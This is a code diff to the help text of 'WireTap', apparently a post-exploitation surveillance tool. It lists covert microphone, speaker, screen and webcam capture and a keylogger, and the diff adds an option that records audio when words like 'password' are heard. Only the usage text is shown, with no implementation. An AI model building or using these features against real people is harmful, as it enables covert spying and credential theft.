@@ -35,23 +35,26 @@ namespace WireTap
         public static void Usage()
         {
             string usageString = @"
-WireTap.exe [argument]
+WireTap.exe [arguments]
 
 Arguments can be one (and only one) of the following:
-    record_mic [10s]    - Record audio from the attached microphone (line-in).
-                          Time suffix can be s/m/h.
+    record_mic [10s]     - Record audio from the attached microphone (line-in).
+                           Time suffix can be s/m/h.
     
-    record_sys [10s]    - Record audio from the system speakers (line-out).
-                          Time suffix can be s/m/h.
+    record_sys [10s]     - Record audio from the system speakers (line-out).
+                           Time suffix can be s/m/h.
 
-    record_audio [10s]  - Record audio from both the microphone and the speakers and combine into one file.
-                          Time suffix can be s/m/h.
+    record_audio [10s]   - Record audio from both the microphone and the speakers and combine into one file.
+                           Time suffix can be s/m/h.
     
-    capture_screen      - Screenshot the current user's screen.
+    capture_screen       - Screenshot the current user's screen.
 
-    capture_webcam      - Capture images from the user's attached webcam (if it exists).
+    capture_webcam       - Capture images from the user's attached webcam (if it exists).
 
-    keylogger           - Begin logging keystrokes to a file.
+    keylogger            - Begin logging keystrokes to a file.
+
+    listen_for_passwords - Listens for words 'username', 'password', 'login' and 'credential', and when heard,
+                           starts an audio recording for two minutes.
 
 Examples:
     Record all audio for 30 seconds:
